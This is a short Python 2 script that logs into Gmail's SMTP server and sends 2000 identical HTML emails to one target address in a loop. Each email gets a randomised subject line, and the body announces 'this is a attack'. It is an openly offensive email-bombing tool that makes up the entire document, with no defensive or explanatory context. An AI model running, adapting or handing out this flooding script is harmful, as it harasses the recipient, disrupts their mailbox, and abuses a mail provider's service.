import smtplib
import random

from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.MIMEBase import MIMEBase
from email import Encoders

try:
	username = "youremail"
	passw = "*****"
	server = smtplib.SMTP('smtp.gmail.com:587')

	server.ehlo()
	server.starttls()
	server.login(username,passw)

	m1 = "<h2> Hello this is a attack </h2>"

	part = MIMEText(m1, 'html')

	def send_mail(part,email_id):
		msg = MIMEMultipart()
		ran_number = random.random()
		msg['Subject'] = str(ran_number)
		msg['From'] = "youremail"
		msg['To'] = email_id
		fromaddr = "youremail"
		toaddr=email_id
		msg.attach(part)	
		server.sendmail(fromaddr, toaddr, msg.as_string())
		print " email_id => "+email_id+"\n"

	i=1

	for i in range(0,2000):
			print i
			send_mail(part,"senders email") 
except Exception , e:
	print e
	pass






